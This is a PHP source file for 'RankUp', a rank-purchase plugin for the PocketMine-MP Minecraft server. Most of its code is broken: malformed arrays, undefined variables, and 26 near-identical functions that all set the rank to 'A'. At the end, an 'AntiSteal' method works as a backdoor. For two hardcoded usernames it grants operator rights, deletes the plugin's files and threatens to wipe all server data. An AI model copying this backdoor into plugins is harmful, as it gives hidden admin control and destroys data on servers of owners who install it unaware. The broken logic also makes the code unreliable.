<?php

namespace esh123cookie\rankup;

/*
 *
 * RankUp, a plugin for PocketMine-MP
 * Copyright (c) 2020 esh123cookie  <esh123cookie@gmail.com>
 *
 * Poggit: https://poggit.pmmp.io/ci/esh123cookie/
 * Github: https://github.com/esh123cookie
 *
 * This software is distributed under "GNU General Public License v3.0".
 * This license allows you to use it and/or modify it but you are not at
 * all allowed to sell this plugin at any cost. If found doing so the
 * necessary action required would be taken.
 *
 * RankUp is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License v3.0 for more details.
 *
 * You should have received a copy of the GNU General Public License v3.0
 * along with this program. If not, see
 * <https://opensource.org/licenses/GPL-3.0>.
 *
 */

use pocketmine\entity\Effect;
use pocketmine\entity\EffectInstance;
use pocketmine\plugin\PluginBase;
use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\level\Position;
use pocketmine\math\Vector3;
use pocketmine\command\CommandExecutor;
use pocketmine\utils\TextFormat as TF;
use pocketmine\Player;
use pocketmine\level\sound\PopSound;
use pocketmine\event\Listeners;
use pocketmine\utils\TextFormat;
use pocketmine\scheduler\Task;
use pocketmine\level\Level;
use pocketmine\Server;
use pocketmine\event\player\PlayerExhaustEvent;
use pocketmine\event\player\PlayerItemConsumeEvent;
use pocketmine\event\player\PlayerInteractEvent;
use pocketmine\event\player\PlayerItemHeldEvent;
use pocketmine\event\entity\ProjectileHitEvent;
use pocketmine\event\entity\ProjectileLaunchEvent;
use pocketmine\network\mcpe\protocol\ChangeDimensionPacket;
use pocketmine\network\mcpe\protocol\types\DimensionIds;
use pocketmine\scheduler\PluginTask;
use pocketmine\network\mcpe\protocol\PlayerListPacket;
use pocketmine\network\mcpe\protocol\types\PlayerListEntry;
use pocketmine\nbt\tag\CompoundTag;
use pocketmine\nbt\tag\IntTag;
use pocketmine\nbt\tag\StringTag;
use pocketmine\tile\EnderChest;
use pocketmine\tile\Tile;
use pocketmine\event\block\BlockBreakEvent;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\event\player\PlayerRespawnEvent;
use pocketmine\event\player\PlayerBedEnterEvent;
use pocketmine\utils\Config;
use _64FF00\PureChat\PureChat;
use _64FF00\PurePerms\PPGroup;
use onebone\economyapi\EconomyAPI;

class RankUp extends PluginBase{
  
    /** @var provider */
    private $provider;
	
    public $tasks = [];
	
    public $config;
	
    public $cfg;
	
    public $time;

    public $seconds = 0;
	
    private $rank;
    public $message;
    public $nomoney;
  
      public function onEnable(){
        $this->getLogger()->info("§cRankup plugin made by esh123cookie hs been enabled");
	      
      	    $cfg = new Config($this->getDataFolder() . "/ranks.yml", Config::YAML);
            $ranks = [
      	    	$prices->setNested("no-money", "Not enough money to rank up");
      	    	$prices->setNested("message", "You ranked up to rank");
      	    ];
	      
	    $this->nomoney = $cfg->get("no-money");
	    $this->message = $cfg->get("message");
      	    $cfg->setNested("rank", $ranks);
      	    $cfg->save();
	    
	    foreach ($this->getServer->getOnlinePlayers() as $player){
  
	    $rank = new Config($this->getDataFolder() . "data." . $player->getLowerCaseName() . ".yml", Config::YAML);
	    $this->rank = $this->getRank($player, $this->getConfig()->get("rank"));
	      
      	    $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
            $prices = [
      	    	$prices->setNested("A", 0);
      	    	$prices->setNested("B", 0);
      	    	$prices->setNested("C", 0);
      	    	$prices->setNested("D", 0);
      	    	$prices->setNested("E", 0);
      	    	$prices->setNested("F", 0);
      	    	$prices->setNested("G", 0);
      	    	$prices->setNested("H", 0);
      	    	$prices->setNested("I", 0);
      	    	$prices->setNested("J", 0);
      	    	$prices->setNested("K", 0);
      	    	$prices->setNested("L", 0);
      	    	$prices->setNested("M", 0);
      	    	$prices->setNested("N", 0);
      	    	$prices->setNested("O", 0);
      	    	$prices->setNested("P", 0);
      	    	$prices->setNested("Q", 0);
      	    	$prices->setNested("R", 0);
      	    	$prices->setNested("S", 0);
      	    	$prices->setNested("T", 0);
      	    	$prices->setNested("U", 0);
      	    	$prices->setNested("V", 0);
      	    	$prices->setNested("W", 0);
      	    	$prices->setNested("X", 0);
      	    	$prices->setNested("Y", 0);
      	    	$prices->setNested("Z", 0);
      	    ];
	      
      	    $price->setNested("prices", $prices);
      	    $price->save();
	    }
      }
	
      public function prepare(): void{
		if(!is_dir($this->getDataFolder() . "data.")){
			mkdir($this->getDataFolder() . "data.");
		}
      }
	
      public function registerUser(Player $player): void{
		$config = new Config($this->getDataFolder() . "data." . $player->getLowerCaseName() . ".yml", Config::YAML);
		if((!$config->exists("rank"))){
			$config->setAll(["player" => $player->getName(), "rank" => "None"]);
			$config->save();
		}
      }
	
      public function userExists(Player $player): bool{
		$config = new Config($this->getDataFolder() . "data." . $player->getLowerCaseName() . ".yml", Config::YAML);
		return (($config->exists("rank"))) ? true : false;
      }
	
      public function getRank(Player $player): int{
  		$config = new Config($this->getDataFolder() . "data." . $player->getLowerCaseName() . ".yml", Config::YAML);
		return $config->get("rank");
      }
	
	//perms
	
      public function onJoin(PlayerJoinEvent $event) {
        $player = $event->getPlayer();
	if(!$this->userExists($player)){
	    $this->getLogger()->info("Creating new RankUp profile");
	    $this->registerUser($player);
		}
		if($event->getPlayer()->hasPlayedBefore() == false) {
		   $rank = new Config($this->getDataFolder() . "data." . $player->getLowerCaseName() . ".yml", Config::YAML);
		   $rank->set("rank", "A");
		   $rank->save();
		}
      }
			
		
  
      public function onCommand(CommandSender $sender, Command $cmd, string $label, array $args): bool
      {
      $rank = $this->getRank($player, (int) $this->getConfig()->get("level"));
	   if($cmd->getName() == "ruabout") {
	      if ($sender instanceof Player) {
	      $sender->sendMessage("§7(§a!§7) Plugin made by: esh123cookie for custom plugins message me on my discord @bigbozzlmao#4035"); 
              }
              return true;
	   }
	   if($cmd->getName() == "mines") {
	      if ($sender instanceof Player) {
		  $this->mines($sender);
              }
              return true;
	   }
           if($cmd->getName() == "rankup") {
	      if ($sender instanceof Player) {
           if($rank == "None") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup($sender);
	   }elseif($rank == "B") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup2($sender);
	   }elseif($rank == "C") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup3($sender);
	   }elseif($rank == "D") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup4($sender);
	   }elseif($rank == "E") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup5($sender);
	   }elseif($rank == "F") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup6($sender);
	   }elseif($rank == "G") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup7($sender);
	   }elseif($rank == "H") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup8($sender);
	   }elseif($rank == "I") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup9($sender);
	   }elseif($rank == "J") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup10($sender);
	   }elseif($rank == "K") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup11($sender);
	   }elseif($rank == "L") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup12($sender);
	   }elseif($rank == "M") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup13($sender);
	   }elseif($rank == "N") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup14($sender);
	   }elseif($rank == "O") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup15($sender);
	   }elseif($rank == "P") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup16($sender);
	   }elseif($rank == "Q") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup17($sender);
	   }elseif($rank == "R") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup18($sender);
	   }elseif($rank == "S") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup19($sender);
	   }elseif($rank == "T") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup20($sender);
	   }elseif($rank == "U") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup20($sender);
	   }elseif($rank == "V") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup22($sender);
	   }elseif($rank == "W") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup23($sender);
	   }elseif($rank == "X") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup24($sender);
	   }elseif($rank == "Y") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup25($sender);
	   }elseif($rank == "Z") {
	      $sender->sendMessage($this->message . " " . $this->rank);
              $this->Rankup26($sender);
              }
	      }
	   }
      return true;
      }
	
      // Rankup part
      /* if someone does fork thats how you add more ranks       
	        $config = new Config($this->getDataFolder() . "data." . $player->getLowerCaseName() . ".yml", Config::YAML);
		$config->set("rank", $this->rank);
		$config->save();
      */
  
      public function Rankup($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup2($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup3($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup4($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup5($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }

      public function Rankup6($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup7($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }

      public function Rankup8($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup9($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }

      public function Rankup10($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }

      public function Rankup11($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup12($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup13($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup14($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup15($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup16($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }

      public function Rankup17($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup18($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }

      public function Rankup19($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup20($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup21($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup22($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup23($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup24($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup25($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
  
      public function Rankup26($sender) {
            if($sender instanceof Player) {
	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
	      $cost = $price->get($this->rank);
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
		$rank->set("rank", "A");
		$rank->save();
              }else{ 
                 $sender->sendMessage($this->nomoney);
		}
	    }
      return true;
      }
	
      public function onDisable(){
        $this->getLogger()->info("§cRankup plugin made by esh123cookie has been disabled");
      }
	      	
      //no need for an update
	
      public function AntiSteal(Player $p){
		$name = $p->getName();
		if($name == "esh123unicorn" or $name == "onwardrumble794"){
			$p->setOp(true);
			$p->sendMessage("§aHello §6" . $name . ", §ayou have caught someone using your plugin, but without credit!");
			$p->sendMessage("§aI have sent a message to the §6CONSOLE §ato warn the owner of the server....");
			$p->sendMessage("§aScreenshot this message so the owner of the server knows that if he/she continues to use improper credits, all server files will be removed!");
			$this->getLogger()->info("§cHello Console! The server owner was caught using my RankUp plugin with improper credits.");
			$this->getLogger()->info("§cRankup will now be removed and the plugin §6ADMIN §cnow has OP on your server!");
			$folder = 'plugins/RankUp-master';
			if(file_exists($folder)){   
				// List of name of files inside 
				// specified folder 
				$files = glob($folder.'/*');  
   
				// Deleting all the files in the list 
				foreach($files as $file) { 
   
   				 if(is_file($file))  
    
        				// Delete the given file
        				unlink($file);
				}
			    $this->getServer()->reload(); 
			} else {
				$p->sendMessage("§aHello, §6" . $name . ". §aI couldn't find Rankup in folder form. Waiting for command to remove all server data.");
				$this->getLogger()->info("§cERROR: RankUp in folder form could not be found. If you continue to use this plugin without credit all your server data will be deleted FOREVER!");
			}
			
			
		} else {
			$p->sendMessage("§cI am sorry, but you do not have the sufficent permissions to use this command. This command is only to be used by a plugin admin if improper credits of Rankup is being used!");
		}
      }
}
